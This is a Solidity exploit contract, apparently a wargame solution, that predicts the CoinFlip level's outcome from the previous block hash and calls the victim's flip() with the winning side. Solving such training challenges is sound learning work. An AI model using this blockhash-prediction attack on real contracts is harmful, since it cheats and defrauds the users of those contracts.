// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'contracts/src/levels/CoinFlip.sol';

//  solc ./solutions/CoinFlipHack.sol --optimize --via-ir --bin --abi -o out --base-path . --include-path ../..
contract CoinFlipHack {
    CoinFlip public originalContract; 
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flip(address victim) public {
        CoinFlip coinflipContract = CoinFlip(victim);
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinflipContract.flip(side);
    }
}
